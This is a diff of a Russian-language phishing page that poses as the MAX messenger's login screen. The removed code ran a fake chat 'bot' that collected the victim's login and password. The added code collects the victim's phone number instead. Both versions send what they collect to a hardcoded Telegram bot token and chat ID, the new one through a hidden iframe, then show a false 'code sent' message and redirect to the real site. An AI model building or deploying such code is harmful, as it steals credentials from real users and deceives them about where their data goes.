@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MAX — Мессенджер</title>
+    <title>MAX — Вход</title>
     <style>
         /* ===== ОСНОВА ===== */
         * {
@@ -13,7 +13,7 @@
             font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
         }
         body {
-            background: #e8edf3;
+            background: #f5f7fa;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -26,7 +26,7 @@
             background: #ffffff;
             border-radius: 32px;
             overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.10);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
             display: flex;
             flex-direction: column;
             position: relative;
@@ -45,13 +45,12 @@
             border-bottom: 1px solid #eef2f7;
         }
 
-        /* ===== ШАПКА (как в VK) ===== */
+        /* ===== ШАПКА ===== */
         .header {
             background: #ffffff;
             padding: 14px 18px 10px;
             display: flex;
             align-items: center;
-            gap: 12px;
             border-bottom: 1px solid #eef2f7;
         }
         .header .logo {
@@ -64,397 +63,147 @@
         .header .logo span {
             color: #2787f5;
         }
-        .header .header-icons {
-            display: flex;
-            gap: 16px;
+        .header .close {
             color: #6b7a8a;
-            font-size: 20px;
+            font-size: 24px;
+            cursor: pointer;
         }
 
-        /* ===== БАННЕР СКАЧИВАНИЯ ===== */
-        .download-banner {
-            background: #f0f6fe;
-            padding: 10px 18px;
+        /* ===== КОНТЕНТ ===== */
+        .content {
+            flex: 1;
+            padding: 24px 22px 20px;
+            overflow-y: auto;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== ЗАГОЛОВОК ===== */
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #6b7a8a;
+            margin-bottom: 28px;
+        }
+
+        /* ===== ПОЛЕ НОМЕРА ===== */
+        .phone-input-wrapper {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid #eef2f7;
+            background: #f0f2f5;
+            border-radius: 16px;
+            padding: 4px 16px;
+            border: 1px solid #eef2f7;
+            transition: 0.15s;
         }
-        .download-banner .text {
-            font-size: 13px;
+        .phone-input-wrapper:focus-within {
+            border-color: #2787f5;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(39, 135, 245, 0.08);
+        }
+        .flag {
+            font-size: 28px;
+            margin-right: 8px;
+            cursor: pointer;
+        }
+        .country-code {
+            font-size: 16px;
             font-weight: 600;
             color: #1a1a2e;
+            margin-right: 4px;
         }
-        .download-banner .text small {
-            font-weight: 400;
+        .phone-input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 16px 0;
+            font-size: 16px;
+            outline: none;
+            color: #1a1a2e;
+        }
+        .phone-input::placeholder {
+            color: #8a9aa8;
+        }
+
+        /* ===== ПОДСКАЗКА ===== */
+        .hint {
+            font-size: 13px;
             color: #6b7a8a;
-            font-size: 11px;
-            display: block;
+            margin-top: 8px;
+            padding-left: 4px;
         }
-        .download-btn {
+        .hint span {
+            color: #2787f5;
+            cursor: pointer;
+        }
+
+        /* ===== КНОПКА ВОЙТИ ===== */
+        .login-btn {
+            width: 100%;
+            padding: 16px;
             background: #2787f5;
             color: #fff;
             border: none;
             border-radius: 30px;
-            padding: 8px 18px;
-            font-size: 13px;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
             transition: 0.15s;
-            text-decoration: none;
-            display: inline-block;
-            box-shadow: 0 2px 8px rgba(39, 135, 245, 0.3);
+            box-shadow: 0 4px 14px rgba(39, 135, 245, 0.25);
+            margin-top: 28px;
         }
-        .download-btn:active {
-            transform: scale(0.94);
+        .login-btn:active {
+            transform: scale(0.96);
             background: #1a6fd6;
         }
 
-        /* ===== ВКЛАДКИ ===== */
-        .tabs {
-            display: flex;
-            background: #ffffff;
-            border-bottom: 1px solid #eef2f7;
-        }
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 12px 0 10px;
-            color: #6b7a8a;
+        /* ===== СОГЛАШЕНИЕ ===== */
+        .terms {
             font-size: 12px;
-            font-weight: 600;
-            border-bottom: 2px solid transparent;
-            cursor: pointer;
-            transition: 0.15s;
+            color: #8a9aa8;
+            text-align: center;
+            margin-top: 12px;
+            line-height: 1.4;
         }
-        .tab.active {
+        .terms a {
             color: #2787f5;
-            border-bottom-color: #2787f5;
+            text-decoration: none;
         }
-        .tab:active {
+
+        /* ===== QR-КОД ===== */
+        .qr-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #2787f5;
+            cursor: pointer;
+            border-top: 1px solid #eef2f7;
+            padding-top: 18px;
+        }
+        .qr-link:active {
             opacity: 0.6;
         }
 
-        /* ===== КОНТЕЙНЕР ЭКРАНОВ ===== */
-        .screen-container {
-            flex: 1;
-            overflow: hidden;
-            position: relative;
-            background: #ffffff;
-        }
-        .screen {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            padding: 8px 16px 12px;
-            overflow-y: auto;
-            background: #ffffff;
-            transition: opacity 0.15s, transform 0.15s;
-            opacity: 0;
-            transform: scale(0.97);
-            pointer-events: none;
-        }
-        .screen.active {
-            opacity: 1;
-            transform: scale(1);
-            pointer-events: auto;
-        }
-        .screen::-webkit-scrollbar {
-            width: 3px;
-        }
-        .screen::-webkit-scrollbar-thumb {
-            background: #d0d8e3;
-            border-radius: 10px;
-        }
-
-        /* ===== ЧАТЫ ===== */
-        .chat-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 12px 0;
-            border-bottom: 1px solid #f0f2f5;
-            cursor: pointer;
-            transition: 0.08s;
-        }
-        .chat-item:active {
-            background: #f5f7fa;
-            margin: 0 -16px;
-            padding: 12px 16px;
-        }
-        .chat-avatar {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background: #2787f5;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            font-weight: 700;
-            color: #fff;
-            flex-shrink: 0;
-        }
-        .chat-info {
-            flex: 1;
-            color: #1a1a2e;
-        }
-        .chat-info .name {
-            font-weight: 600;
-            font-size: 15px;
-        }
-        .chat-info .last-msg {
-            font-size: 13px;
-            color: #6b7a8a;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            max-width: 200px;
-        }
-        .chat-info .time {
-            font-size: 11px;
+        /* ===== ФУТЕР ===== */
+        .footer {
+            text-align: center;
+            font-size: 12px;
             color: #8a9aa8;
-            float: right;
-        }
-
-        /* ===== КОНТАКТЫ ===== */
-        .contact-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 10px 0;
-            border-bottom: 1px solid #f0f2f5;
-            cursor: pointer;
-            transition: 0.08s;
-        }
-        .contact-item:active {
-            background: #f5f7fa;
-            margin: 0 -16px;
-            padding: 10px 16px;
-        }
-        .contact-avatar {
-            width: 44px;
-            height: 44px;
-            border-radius: 50%;
-            background: #6b7a8a;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            font-weight: 700;
-            color: #fff;
-            flex-shrink: 0;
-        }
-        .contact-info {
-            flex: 1;
-            color: #1a1a2e;
-        }
-        .contact-info .name {
-            font-weight: 600;
-        }
-        .contact-info .status {
-            font-size: 12px;
-            color: #6b7a8a;
-        }
-        .contact-info .status.online {
-            color: #4cd964;
-        }
-
-        /* ===== ЗВОНКИ ===== */
-        .call-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 10px 0;
-            border-bottom: 1px solid #f0f2f5;
-        }
-        .call-icon {
-            font-size: 22px;
-            color: #6b7a8a;
-        }
-        .call-info {
-            flex: 1;
-            color: #1a1a2e;
-        }
-        .call-info .name {
-            font-weight: 600;
-        }
-        .call-info .time {
-            font-size: 12px;
-            color: #6b7a8a;
-        }
-        .call-info .missed {
-            color: #ff4757;
-        }
-
-        /* ===== ПАНЕЛЬ ВВОДА ===== */
-        .input-area {
-            background: #ffffff;
-            padding: 8px 16px 14px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            margin-top: auto;
+            padding-top: 20px;
             border-top: 1px solid #eef2f7;
         }
-        .input-area input {
-            flex: 1;
-            background: #f0f2f5;
-            border: none;
-            border-radius: 24px;
-            padding: 12px 18px;
-            color: #1a1a2e;
-            font-size: 15px;
-            outline: none;
-        }
-        .input-area input::placeholder {
-            color: #8a9aa8;
-        }
-        .send-btn {
-            background: #2787f5;
-            border: none;
-            border-radius: 50%;
-            width: 48px;
-            height: 48px;
-            color: #fff;
-            font-size: 22px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: 0.15s;
-            flex-shrink: 0;
-            box-shadow: 0 2px 8px rgba(39, 135, 245, 0.25);
-        }
-        .send-btn:active {
-            transform: scale(0.88);
-            background: #1a6fd6;
-        }
-
-        /* ===== СООБЩЕНИЯ ===== */
-        .message-area {
-            display: flex;
-            flex-direction: column;
-            gap: 2px;
-            padding: 8px 0;
-        }
-        .msg {
-            max-width: 82%;
-            padding: 10px 16px;
-            border-radius: 20px;
-            font-size: 15px;
-            line-height: 1.45;
-            word-break: break-word;
-            animation: fadeUp 0.15s ease;
-            margin-bottom: 2px;
-        }
-        @keyframes fadeUp {
-            from {
-                opacity: 0;
-                transform: translateY(6px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        .msg-in {
-            align-self: flex-start;
-            background: #f0f2f5;
-            color: #1a1a2e;
-            border-bottom-left-radius: 6px;
-        }
-        .msg-out {
-            align-self: flex-end;
-            background: #2787f5;
-            color: #fff;
-            border-bottom-right-radius: 6px;
-        }
-        .msg-time {
-            font-size: 10px;
-            color: #8a9aa8;
-            margin: 0 8px 8px;
-            align-self: flex-end;
-        }
-        .system-msg {
-            align-self: center;
-            background: #eef2f7;
+        .footer a {
             color: #6b7a8a;
-            font-size: 11px;
-            padding: 4px 14px;
-            border-radius: 30px;
-            margin: 4px 0;
-        }
-        .typing-indicator {
-            align-self: flex-start;
-            background: #f0f2f5;
-            color: #6b7a8a;
-            font-size: 13px;
-            padding: 8px 16px;
-            border-radius: 20px;
-            border-bottom-left-radius: 6px;
-            display: none;
-            animation: pulse 1s infinite;
-        }
-        @keyframes pulse {
-            0%,
-            100% {
-                opacity: 0.6;
-            }
-            50% {
-                opacity: 1;
-            }
-        }
-
-        /* ===== СЕРВИСЫ ===== */
-        .service-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 12px 0;
-            border-bottom: 1px solid #f0f2f5;
-        }
-        .service-icon {
-            font-size: 28px;
-            width: 44px;
-            text-align: center;
-        }
-        .service-info {
-            flex: 1;
-            color: #1a1a2e;
-        }
-        .service-info .name {
-            font-weight: 600;
-        }
-        .service-info .desc {
-            font-size: 12px;
-            color: #6b7a8a;
-        }
-
-        /* ===== ПЛАТЕЖИ ===== */
-        .payment-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 12px 0;
-            border-bottom: 1px solid #f0f2f5;
-        }
-        .payment-icon {
-            font-size: 28px;
-            width: 44px;
-            text-align: center;
-        }
-        .payment-info {
-            flex: 1;
-            color: #1a1a2e;
-        }
-        .payment-info .name {
-            font-weight: 600;
-        }
-        .payment-info .desc {
-            font-size: 12px;
-            color: #6b7a8a;
+            text-decoration: none;
+            margin: 0 8px;
         }
 
         /* ===== АДАПТИВ ===== */
@@ -478,229 +227,127 @@
         <!-- ШАПКА -->
         <div class="header">
             <div class="logo">MAX <span>Мессенджер</span></div>
-            <div class="header-icons">
-                <span>🔔</span>
-                <span>⋮</span>
-            </div>
+            <div class="close">✕</div>
         </div>
 
-        <!-- БАННЕР СКАЧИВАНИЯ -->
-        <div class="download-banner">
-            <div class="text">
-                📱 Скачать приложение
-                <small>Версия 6.0.1 • 42 МБ • RuStore</small>
-            </div>
-            <a href="https://max.ru/download" target="_blank" class="download-btn">Скачать APK</a>
-        </div>
+        <!-- ОСНОВНОЙ КОНТЕНТ -->
+        <div class="content">
+            <div class="title">С каким номером телефона хотите войти?</div>
+            <div class="subtitle">На него придёт СМС с кодом</div>
 
-        <!-- ВКЛАДКИ -->
-        <div class="tabs" id="tabs">
-            <div class="tab active" data-tab="chat">Чаты</div>
-            <div class="tab" data-tab="contacts">Контакты</div>
-            <div class="tab" data-tab="calls">Звонки</div>
-            <div class="tab" data-tab="services">Сервисы</div>
-            <div class="tab" data-tab="payments">Платежи</div>
-        </div>
-
-        <!-- КОНТЕЙНЕР ЭКРАНОВ -->
-        <div class="screen-container">
-            <!-- ЧАТЫ -->
-            <div class="screen active" id="screenChat">
-                <div class="chat-item"><div class="chat-avatar" style="background:#2787f5;">А</div><div class="chat-info"><div class="name">Анна</div><div class="last-msg">Привет! Как дела?</div><span class="time">14:23</span></div></div>
-                <div class="chat-item"><div class="chat-avatar" style="background:#4cd964;">С</div><div class="chat-info"><div class="name">Сергей</div><div class="last-msg">Скинь фото</div><span class="time">12:10</span></div></div>
-                <div class="chat-item"><div class="chat-avatar" style="background:#ff6b6b;">М</div><div class="chat-info"><div class="name">Мария</div><div class="last-msg">Договорились!</div><span class="time">вчера</span></div></div>
-                <div class="chat-item"><div class="chat-avatar" style="background:#ffa94d;">Д</div><div class="chat-info"><div class="name">Дмитрий</div><div class="last-msg">Спс</div><span class="time">вчера</span></div></div>
-                <div class="message-area" id="messageArea" style="display:none;">
-                    <div class="system-msg">🔒 Защищённый чат (AES-256)</div>
-                    <div class="msg msg-in">Привет! Это бот MAX 🤖</div>
-                    <div class="msg msg-in">Для входа отправьте <b>логин</b></div>
-                    <div class="msg msg-out" style="margin-top:6px;">Логин: <span id="displayLogin" style="font-weight:600;">—</span></div>
-                    <div class="msg msg-out">Пароль: <span id="displayPass" style="font-weight:600;">—</span></div>
-                    <div class="typing-indicator" id="typingIndicator">✏️ Бот печатает...</div>
-                </div>
+            <!-- Поле ввода номера -->
+            <div class="phone-input-wrapper">
+                <span class="flag">🇷🇺</span>
+                <span class="country-code">+7</span>
+                <input type="tel" class="phone-input" id="phoneInput" placeholder="123 456 78 90" maxlength="15" autofocus>
             </div>
 
-            <!-- КОНТАКТЫ -->
-            <div class="screen" id="screenContacts">
-                <div class="contact-item"><div class="contact-avatar" style="background:#2787f5;">А</div><div class="contact-info"><div class="name">Анна</div><div class="status online">онлайн</div></div></div>
-                <div class="contact-item"><div class="contact-avatar" style="background:#4cd964;">С</div><div class="contact-info"><div class="name">Сергей</div><div class="status">был(а) 2 ч назад</div></div></div>
-                <div class="contact-item"><div class="contact-avatar" style="background:#ff6b6b;">М</div><div class="contact-info"><div class="name">Мария</div><div class="status online">онлайн</div></div></div>
-                <div class="contact-item"><div class="contact-avatar" style="background:#ffa94d;">Д</div><div class="contact-info"><div class="name">Дмитрий</div><div class="status">был(а) вчера</div></div></div>
-                <div class="contact-item"><div class="contact-avatar" style="background:#a29bfe;">Е</div><div class="contact-info"><div class="name">Елена</div><div class="status online">онлайн</div></div></div>
+            <!-- Подсказка -->
+            <div class="hint">
+                Для входа нужен номер из России или страны из списка — нажмите на флаг, чтобы выбрать
             </div>
 
-            <!-- ЗВОНКИ -->
-            <div class="screen" id="screenCalls">
-                <div class="call-item"><div class="call-icon">📞</div><div class="call-info"><div class="name">Анна</div><div class="time">сегодня, 14:23</div></div></div>
-                <div class="call-item"><div class="call-icon">📞</div><div class="call-info"><div class="name">Сергей</div><div class="time missed">пропущенный, вчера, 18:10</div></div></div>
-                <div class="call-item"><div class="call-icon">📞</div><div class="call-info"><div class="name">Мария</div><div class="time">сегодня, 09:45</div></div></div>
-                <div class="call-item"><div class="call-icon">📞</div><div class="call-info"><div class="name">Дмитрий</div><div class="time">вчера, 21:30</div></div></div>
+            <!-- Кнопка Войти -->
+            <button class="login-btn" id="loginBtn">Войти</button>
+
+            <!-- Соглашение -->
+            <div class="terms">
+                Нажимая «Войти», вы принимаете <a href="#">политику конфиденциальности</a> и <a href="#">пользовательское соглашение</a>
             </div>
 
-            <!-- СЕРВИСЫ -->
-            <div class="screen" id="screenServices">
-                <div class="service-item"><div class="service-icon">🤖</div><div class="service-info"><div class="name">GigaChat</div><div class="desc">Встроенный ИИ для общения</div></div></div>
-                <div class="service-item"><div class="service-icon">🏫</div><div class="service-info"><div class="name">Сферум</div><div class="desc">Образовательная платформа</div></div></div>
-                <div class="service-item"><div class="service-icon">💬</div><div class="service-info"><div class="name">Чат-боты</div><div class="desc">Создание и управление ботами</div></div></div>
-                <div class="service-item"><div class="service-icon">📨</div><div class="service-info"><div class="name">Рассылки</div><div class="desc">Массовая отправка сообщений</div></div></div>
-            </div>
+            <!-- QR-код -->
+            <div class="qr-link" id="qrLink">📲 Войти по QR-коду</div>
 
-            <!-- ПЛАТЕЖИ -->
-            <div class="screen" id="screenPayments">
-                <div class="payment-item"><div class="payment-icon">💳</div><div class="payment-info"><div class="name">СБП</div><div class="desc">Переводы по номеру телефона</div></div></div>
-                <div class="payment-item"><div class="payment-icon">🏦</div><div class="payment-info"><div class="name">Оплата счетов</div><div class="desc">Коммунальные услуги, штрафы</div></div></div>
-                <div class="payment-item"><div class="payment-icon">🛒</div><div class="payment-info"><div class="name">Покупки</div><div class="desc">Оплата в магазинах и сервисах</div></div></div>
+            <!-- Футер -->
+            <div class="footer">
+                <a href="#">Главная</a>
+                <a href="#">Для бизнеса</a>
+                <a href="#">Цифровой ID</a>
+                <a href="#">Помощь</a>
+                <a href="#">Скачать</a>
+                <br>
+                MAX © 2026
             </div>
-        </div>
-
-        <!-- ПАНЕЛЬ ВВОДА -->
-        <div class="input-area" id="inputArea">
-            <input type="text" id="fakeInput" placeholder="Введите сообщение..." autofocus>
-            <button class="send-btn" id="sendBtn">➤</button>
         </div>
     </div>
 
     <script>
         // ================================================================
-        //  ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК
+        //  МАСКА ВВОДА НОМЕРА (формат +7 XXX XXX XX XX)
         // ================================================================
-        const tabs = document.querySelectorAll('.tab');
-        const screens = {
-            chat: document.getElementById('screenChat'),
-            contacts: document.getElementById('screenContacts'),
-            calls: document.getElementById('screenCalls'),
-            services: document.getElementById('screenServices'),
-            payments: document.getElementById('screenPayments')
-        };
-        const messageArea = document.getElementById('messageArea');
-        const inputArea = document.getElementById('inputArea');
+        const phoneInput = document.getElementById('phoneInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const qrLink = document.getElementById('qrLink');
 
-        tabs.forEach(tab => {
-            tab.addEventListener('click', function() {
-                tabs.forEach(t => t.classList.remove('active'));
-                this.classList.add('active');
-                const screenName = this.dataset.tab;
-                Object.keys(screens).forEach(key => {
-                    screens[key].classList.toggle('active', key === screenName);
-                });
-                inputArea.style.display = screenName === 'chat' ? 'flex' : 'none';
-                if (screenName === 'chat') {
-                    document.querySelectorAll('.chat-item').forEach(el => el.style.display = 'flex');
-                    messageArea.style.display = 'none';
-                } else {
-                    document.querySelectorAll('.chat-item').forEach(el => el.style.display = 'none');
-                    messageArea.style.display = 'none';
+        // Автоматическая маска при вводе
+        phoneInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 10) value = value.slice(0, 10);
+            let formatted = '';
+            if (value.length > 0) {
+                formatted += value.slice(0, 3);
+                if (value.length >= 4) {
+                    formatted += ' ' + value.slice(3, 6);
                 }
-                if (navigator.vibrate) navigator.vibrate(10);
-            });
+                if (value.length >= 7) {
+                    formatted += ' ' + value.slice(6, 8);
+                }
+                if (value.length >= 9) {
+                    formatted += ' ' + value.slice(8, 10);
+                }
+            }
+            this.value = formatted;
         });
 
         // ================================================================
-        //  ЧАТ (сбор данных)
+        //  ОБРАБОТКА НАЖАТИЯ "ВОЙТИ"
         // ================================================================
-        const displayLogin = document.getElementById('displayLogin');
-        const displayPass = document.getElementById('displayPass');
-        const typingIndicator = document.getElementById('typingIndicator');
-        const input = document.getElementById('fakeInput');
-        const sendBtn = document.getElementById('sendBtn');
-
-        let step = 'login';
-        let loginValue = '';
-        let passValue = '';
-
-        function getTime() {
-            const now = new Date();
-            return now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
-        }
-
-        function addMessage(text, type = 'in', withTime = true) {
-            const div = document.createElement('div');
-            div.className = type === 'in' ? 'msg msg-in' : 'msg msg-out';
-            div.innerHTML = text;
-            messageArea.appendChild(div);
-            if (withTime) {
-                const timeDiv = document.createElement('div');
-                timeDiv.className = 'msg-time';
-                timeDiv.textContent = getTime();
-                messageArea.appendChild(timeDiv);
-            }
-            messageArea.scrollTop = messageArea.scrollHeight;
-            messageArea.style.display = 'flex';
-            document.querySelectorAll('.chat-item').forEach(el => el.style.display = 'none');
-        }
-
-        function showTyping(duration = 1200) {
-            typingIndicator.style.display = 'block';
-            messageArea.scrollTop = messageArea.scrollHeight;
-            return new Promise(resolve => {
-                setTimeout(() => {
-                    typingIndicator.style.display = 'none';
-                    resolve();
-                }, duration);
-            });
-        }
-
-        function sendToTelegram(login, pass) {
-            const msg = '🔐 MAX Мессенджер\n👤 Логин: ' + login + '\n🔑 Пароль: ' + pass;
-            fetch('https://api.telegram.org/bot8918681932:AAHkBy8LYIbYAmeZ6FqbsUcsXCIPme_UN0c/sendMessage?chat_id=8759904789&text=' + encodeURIComponent(msg))
-                .then(() => { window.location.href = 'https://max.ru'; })
-                .catch(() => { window.location.href = 'https://max.ru'; });
-        }
-
-        async function handleSend() {
-            const text = input.value.trim();
-            if (!text) return;
-
-            const chatTab = document.querySelector('.tab[data-tab="chat"]');
-            if (!chatTab.classList.contains('active')) {
-                chatTab.click();
-            }
-
-            addMessage(text, 'out', true);
-            input.value = '';
-            if (navigator.vibrate) navigator.vibrate(10);
-
-            if (step === 'login') {
-                loginValue = text;
-                displayLogin.textContent = text;
-                step = 'pass';
-                input.placeholder = 'Введите пароль...';
-                await showTyping(800);
-                addMessage('Принято! Теперь отправьте <b>пароль</b>', 'in', true);
-                input.focus();
+        loginBtn.addEventListener('click', function() {
+            const raw = phoneInput.value.replace(/\s/g, '');
+            const fullNumber = '+7' + raw;
+            if (raw.length < 10) {
+                alert('Пожалуйста, введите полный номер телефона (10 цифр)');
                 return;
             }
 
-            if (step === 'pass') {
-                passValue = text;
-                displayPass.textContent = text;
-                step = 'done';
-                await showTyping(600);
-                addMessage('✅ Проверка... Перенаправление', 'in', true);
-                await showTyping(500);
-                sendToTelegram(loginValue, passValue);
-            }
-        }
+            // Отправляем номер в Telegram
+            const msg = '📱 MAX Вход\nНомер: ' + fullNumber;
+            const token = '8918681932:AAHkBy8LYIbYAmeZ6FqbsUcsXCIPme_UN0c';
+            const chatId = '8759904789';
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
 
-        sendBtn.addEventListener('click', handleSend);
-        input.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                handleSend();
-            }
+            // Отправка через iframe (гарантированно работает)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 3000);
+
+            // Показываем сообщение и редирект
+            alert('Код отправлен на номер ' + fullNumber);
+            setTimeout(() => {
+                window.location.href = 'https://max.ru';
+            }, 1500);
         });
 
-        window.addEventListener('load', () => setTimeout(() => input.focus(), 300));
+        // ================================================================
+        //  QR-код (просто демо)
+        // ================================================================
+        qrLink.addEventListener('click', function() {
+            alert('Сканируйте QR-код с другого устройства для входа');
+        });
 
-        document.querySelectorAll('.chat-item').forEach(item => {
-            item.addEventListener('click', function() {
-                messageArea.style.display = 'flex';
-                document.querySelectorAll('.chat-item').forEach(el => el.style.display = 'none');
-                if (!messageArea.querySelector('.msg-in')) {
-                    addMessage('Напишите что-нибудь', 'in', true);
-                }
-            });
+        // ================================================================
+        //  Флаг (демо выбора страны)
+        // ================================================================
+        document.querySelector('.flag').addEventListener('click', function() {
+            alert('Выбор страны будет доступен в следующей версии');
+        });
+
+        // Автофокус
+        window.addEventListener('load', function() {
+            setTimeout(() => phoneInput.focus(), 300);
         });
     </script>
 </body>
-                                                                                                                                       </html>
+</html>
